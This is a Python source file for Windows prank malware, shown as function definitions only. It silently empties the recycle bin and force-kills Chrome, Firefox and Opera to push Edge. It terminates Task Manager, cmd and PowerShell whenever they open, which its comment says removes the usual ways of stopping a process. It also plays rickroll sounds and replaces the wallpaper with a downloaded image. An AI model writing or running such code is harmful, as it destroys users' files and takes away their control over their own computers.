import winshell

import ctypes
import requests
import threading

import os
import psutil

import subprocess

import playsound as ps
import random


# Empties recycling bin content
def empty():
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except BaseException:
        pass

# Play elevator music
def elevator():
    try:
        i = random.randint(1,20)
        if i < 16:
            ps.playsound('https://cdn.pixabay.com/download/audio/2021/11/18/audio_d702fb7672.mp3?filename=elevator-music-bossa-nova-background-music-version-60s-10900.mp3', False)
        elif i < 20:
            ps.playsound('https://www.soundboardguy.com/wp-content/uploads/2021/04/Vine-Boom-Sound-Effect-Longer-Verison-For-Real-Read-Description-Please.mp3', False)
        else:
            ps.playsound('https://archive.org/download/NeverGonnaGiveYouUp/jocofullinterview41.mp3', False)
    except:
        pass

# Forces user to use Microsoft Edge, by crashing other popular browsers
def edgeForcer():
    msedge = r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'
    found = False
    edge = False
    for i in psutil.process_iter():
        if "opera.exe" == i.name() or "chrome.exe" == i.name() or "firefox.exe" == i.name():
            found = True
            i.terminate()
        # Does not open edge again if already found open
        if "msedge.exe" == i.name():
            edge = True
    if found and os.path.exists(msedge) and not edge:        
        subprocess.Popen([msedge])
        try:
            ps.playsound('https://www.soundjay.com/communication/sounds/dial-up-modem-01.mp3', False)
        except:
            pass

# Crashes task manager, command line or powershell if opened
# Removes conventional ways of stopping a process
def killTask():
    found = False
    for i in psutil.process_iter():
        if "Taskmgr.exe" == i.name() or "cmd.exe" == i.name() or "powershell.exe" == i.name():
            i.terminate()
            found = True
    if found:
        subprocess.Popen(['C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe', 'https://youtu.be/leEQ3nz8O-I'])

# Changes background to specified file path
def setBack(path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 3)

def changeBackground():
    # Changes background image of desktop
    image = 'nevergonna.jpg'
    path = "C:\\Users\\" + os.getlogin() + r'\Downloads\\' + image
    try:
        # Downloads image from internet
        data = requests.get('https://i.imgur.com/A8ZRnhX.jpg').content
        with open(path, 'wb') as img:
            img.write(data)

        # Threading needed to make sure picture is set *before* image is deleted
        thread = threading.Thread(target=setBack(path))
        thread.start()
        thread.join()
        os.remove(path)
    # If user is not connected to internet
    except:
        pass
